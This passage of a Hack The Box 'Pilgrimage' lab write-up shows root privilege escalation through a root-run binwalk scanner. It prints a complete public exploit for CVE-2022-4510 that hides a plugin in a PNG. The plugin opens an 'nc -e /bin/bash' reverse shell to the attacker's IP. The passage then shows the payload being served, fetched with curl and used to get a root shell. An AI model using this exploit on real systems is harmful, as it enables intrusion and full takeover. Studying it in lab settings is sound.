</span></span><span style="display:flex;"><span>www-data     <span style="color:#ae81ff">862</span>  0.0  0.2 <span style="color:#ae81ff">209988</span> <span style="color:#ae81ff">11204</span> ?        S    01:36   0:00 php-fpm: pool www
</span></span><span style="display:flex;"><span>www-data     <span style="color:#ae81ff">863</span>  0.0  0.2 <span style="color:#ae81ff">209988</span> <span style="color:#ae81ff">11204</span> ?        S    01:36   0:00 php-fpm: pool www
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">976</span>  0.0  0.2  <span style="color:#ae81ff">14508</span>  <span style="color:#ae81ff">8676</span> ?        Ss   01:42   0:00 sshd: emily <span style="color:#f92672">[</span>priv<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>emily        <span style="color:#ae81ff">979</span>  0.0  0.1  <span style="color:#ae81ff">15164</span>  <span style="color:#ae81ff">7840</span> ?        Ss   01:42   0:00 /lib/systemd/systemd --user
</span></span><span style="display:flex;"><span>emily        <span style="color:#ae81ff">980</span>  0.0  0.0 <span style="color:#ae81ff">101216</span>  <span style="color:#ae81ff">2524</span> ?        S    01:42   0:00 <span style="color:#f92672">(</span>sd-pam<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>root         <span style="color:#ae81ff">987</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:42   0:00 <span style="color:#f92672">[</span>kworker/1:0-events<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>emily        <span style="color:#ae81ff">998</span>  0.0  0.1  <span style="color:#ae81ff">14720</span>  <span style="color:#ae81ff">6008</span> ?        S    01:42   0:00 sshd: emily@pts/0
</span></span><span style="display:flex;"><span>emily        <span style="color:#ae81ff">999</span>  0.0  0.1   <span style="color:#ae81ff">8164</span>  <span style="color:#ae81ff">4956</span> pts/0    Ss   01:43   0:00 -bash
</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">1002</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    01:43   0:00 <span style="color:#f92672">[</span>kworker/u256:0-ext4-rsv-conversion<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>emily       <span style="color:#ae81ff">1035</span>  0.0  0.0   <span style="color:#ae81ff">9756</span>  <span style="color:#ae81ff">3316</span> pts/0    R+   01:48   0:00 ps aux
</span></span></code></pre></div><p>I read this file <code>/bin/bash /usr/sbin/malwarescan.sh</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>emily@pilgrimage:/var/lib/sudo/lectured$ cat /usr/sbin/malwarescan.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>blacklist<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;Executable script&#34;</span> <span style="color:#e6db74">&#34;Microsoft executable&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span style="color:#66d9ef">while</span> read FILE; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/pilgrimage.htb/shrunk/</span><span style="color:#66d9ef">$(</span>/usr/bin/echo <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> | /usr/bin/tail -n <span style="color:#ae81ff">1</span> | /usr/bin/sed -n -e <span style="color:#e6db74">&#39;s/^.*CREATE //p&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        binout<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>/usr/local/bin/binwalk -e <span style="color:#e6db74">&#34;</span>$filename<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> banned in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>blacklist[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$binout<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *<span style="color:#e6db74">&#34;</span>$banned<span style="color:#e6db74">&#34;</span>* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>                        /usr/bin/rm <span style="color:#e6db74">&#34;</span>$filename<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>                        break
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>This Bash script monitors a specific directory (/var/www/pilgrimage.htb/shrunk/) using inotifywait, a command that waits for file system events. When a new file is created in the monitored directory, the full path to the file is read from the FILE variable.</p>
<p>Next, the path to the file is extracted using tail and sed, and then the binwalk command is used to parse the file. The result of the analysis (binout) is then compared with a list of keywords within the blacklist array.</p>
<p>If one of the blacklisted keywords is found in the scan result (binout), the file is deleted using /usr/bin/rm.</p>
<p>In summary, this script constantly monitors a directory for new files created and tries to parse each new file with binwalk. If one of the blacklisted keywords is found in the analysis, the file is deleted.</p>
<p>Now I search the  <code>version</code> of <code>Binwalk</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>emily@pilgrimage:/$ /usr/local/bin/binwalk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Binwalk v2.3.2
</span></span><span style="display:flex;"><span>Craig Heffner, ReFirmLabs
</span></span><span style="display:flex;"><span>https://github.com/ReFirmLabs/binwalk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Usage: binwalk <span style="color:#f92672">[</span>OPTIONS<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>FILE1<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>FILE2<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>FILE3<span style="color:#f92672">]</span> ...
</span></span></code></pre></div><p>I find this exploit <code>https://www.exploit-db.com/exploits/51249</code>, I copy the exploit in the Local Machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nano priv.py                
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ chmod +x priv.py  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat priv.py           
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: Etienne Lacoche</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE-ID: CVE-2022-4510</span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>import inspect
</span></span><span style="display:flex;"><span>import argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;################################################&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;------------------CVE-2022-4510----------------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;################################################&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;--------Binwalk Remote Command Execution--------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;------Binwalk 2.1.2b through 2.3.2 included-----&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;------------------------------------------------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;################################################&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;----------Exploit by: Etienne Lacoche-----------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;---------Contact Twitter: @electr0sm0g----------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;------------------Discovered by:----------------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;---------Q. Kaiser, ONEKEY Research Lab---------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;---------Exploit tested on debian 11------------&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;################################################&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse.ArgumentParser<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>parser.add_argument<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;file&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to input .png file&#34;</span>,default<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>parser.add_argument<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ip&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ip to nc listener&#34;</span>,default<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>parser.add_argument<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port to nc listener&#34;</span>,default<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser.parse_args<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args.file and args.ip and args.port:
</span></span><span style="display:flex;"><span>    header_pfs <span style="color:#f92672">=</span> bytes.fromhex<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    lines <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;import binwalk.core.plugin\n&#39;</span>,<span style="color:#e6db74">&#39;import os\n&#39;</span>, <span style="color:#e6db74">&#39;import shutil\n&#39;</span>,<span style="color:#e6db74">&#39;class MaliciousExtractor(binwalk.core.plugin.Plugin):\n&#39;</span>,<span style="color:#e6db74">&#39;    def init(self):\n&#39;</span>,<span style="color:#e6db74">&#39;        if not os.path.exists(&#34;/tmp/.binwalk&#34;):\n&#39;</span>,<span style="color:#e6db74">&#39;            os.system(&#34;nc &#39;</span>,str<span style="color:#f92672">(</span>args.ip<span style="color:#f92672">)</span>+<span style="color:#e6db74">&#39; &#39;</span>,str<span style="color:#f92672">(</span>args.port<span style="color:#f92672">)</span>+<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#e6db74">&#39;-e /bin/bash 2&gt;/dev/null &amp;&#34;)\n&#39;</span>,<span style="color:#e6db74">&#39;            with open(&#34;/tmp/.binwalk&#34;, &#34;w&#34;) as f:\n&#39;</span>,<span style="color:#e6db74">&#39;                f.write(&#34;1&#34;)\n&#39;</span>,<span style="color:#e6db74">&#39;        else:\n&#39;</span>,<span style="color:#e6db74">&#39;            os.remove(&#34;/tmp/.binwalk&#34;)\n&#39;</span>, <span style="color:#e6db74">&#39;            os.remove(os.path.abspath(__file__))\n&#39;</span>,<span style="color:#e6db74">&#39;            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), &#34;__pycache__&#34;))\n&#39;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    in_file <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>args.file, <span style="color:#e6db74">&#34;rb&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> in_file.read<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    in_file.close<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    with open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/plugin&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span> as f:
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">for</span> line in lines:
</span></span><span style="display:flex;"><span>          f.write<span style="color:#f92672">(</span>line<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    with open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tmp/plugin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span><span style="color:#f92672">)</span> as f: 
</span></span><span style="display:flex;"><span>        content <span style="color:#f92672">=</span> f.read<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rm /tmp/plugin&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    with open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;binwalk_exploit.png&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span><span style="color:#f92672">)</span> as f:
</span></span><span style="display:flex;"><span>        f.write<span style="color:#f92672">(</span>data<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        f.write<span style="color:#f92672">(</span>header_pfs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        f.write<span style="color:#f92672">(</span>content<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>    
</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;You can now rename and share binwalk_exploit and start your local netcat listener.&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>I see the <code>options</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 priv.py -h                                         
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>------------------CVE-2022-4510----------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>--------Binwalk Remote Command Execution--------
</span></span><span style="display:flex;"><span>------Binwalk 2.1.2b through 2.3.2 included-----
</span></span><span style="display:flex;"><span>------------------------------------------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>----------Exploit by: Etienne Lacoche-----------
</span></span><span style="display:flex;"><span>---------Contact Twitter: @electr0sm0g----------
</span></span><span style="display:flex;"><span>------------------Discovered by:----------------
</span></span><span style="display:flex;"><span>---------Q. Kaiser, ONEKEY Research Lab---------
</span></span><span style="display:flex;"><span>---------Exploit tested on debian 11------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usage: priv.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> file ip port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>positional arguments:
</span></span><span style="display:flex;"><span>  file        Path to input .png file
</span></span><span style="display:flex;"><span>  ip          Ip to nc listener
</span></span><span style="display:flex;"><span>  port        Port to nc listener
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>options:
</span></span><span style="display:flex;"><span>  -h, --help  show this help message and exit
</span></span></code></pre></div><p>I <code>generate</code> the <code>payload</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 priv.py lupin.png 10.10.14.101 <span style="color:#ae81ff">1234</span>      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>------------------CVE-2022-4510----------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>--------Binwalk Remote Command Execution--------
</span></span><span style="display:flex;"><span>------Binwalk 2.1.2b through 2.3.2 included-----
</span></span><span style="display:flex;"><span>------------------------------------------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>----------Exploit by: Etienne Lacoche-----------
</span></span><span style="display:flex;"><span>---------Contact Twitter: @electr0sm0g----------
</span></span><span style="display:flex;"><span>------------------Discovered by:----------------
</span></span><span style="display:flex;"><span>---------Q. Kaiser, ONEKEY Research Lab---------
</span></span><span style="display:flex;"><span>---------Exploit tested on debian 11------------
</span></span><span style="display:flex;"><span><span style="color:#75715e">################################################</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You can now rename and share binwalk_exploit and start your local netcat listener.
</span></span></code></pre></div><p>I open a Web Server in the Local Machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 -m http.server <span style="color:#ae81ff">4444</span> 
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">4444</span> <span style="color:#f92672">(</span>http://0.0.0.0:4444/<span style="color:#f92672">)</span> ...
</span></span></code></pre></div><p>I open a listening port in the Local Machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">1234</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
</span></span></code></pre></div><p>Transfer the payload in the Target Machine, and I copy the payload in this directory <code>/var/www/pilgrimage.htb/shrunk</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>emily@pilgrimage:~$ curl http://10.10.14.101:4444/binwalk_exploit.png -O binwalk_exploit.png
</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  130k  <span style="color:#ae81ff">100</span>  130k    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   214k      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  214k
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>emily@pilgrimage:~$ ls
</span></span><span style="display:flex;"><span>binwalk_exploit.png  user.txt
</span></span><span style="display:flex;"><span>emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
</span></span><span style="display:flex;"><span>emily@pilgrimage:~$ ls -all /var/www/pilgrimage.htb/shrunk/
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">140</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">2</span> root  root    <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">7</span> 03:00 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">7</span> root  root    <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">8</span> 00:10 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> emily emily <span style="color:#ae81ff">133490</span> Sep  <span style="color:#ae81ff">7</span> 03:00 binwalk_exploit.png
</span></span></code></pre></div><p>I get the <code>root flag</code>:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.101] from (UNKNOWN) [10.10.11.219] 35206
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
root@pilgrimage:~/quarantine# whoami
whoami
root
root@pilgrimage:~/quarantine# cat /root/root.txt
cat /root/root.txt
904453b7a7bf4e9f63ae8b81175e7a5f
</code></pre>
      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/wifinetic/">
                <span class="button__icon">←</span>
                <span class="button__text">HTB Writeup - Wifinetic (Easy)</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/posts/pc/">
                <span class="button__text">HTB Writeup - PC (Easy)</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
    
        <span>::  </span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
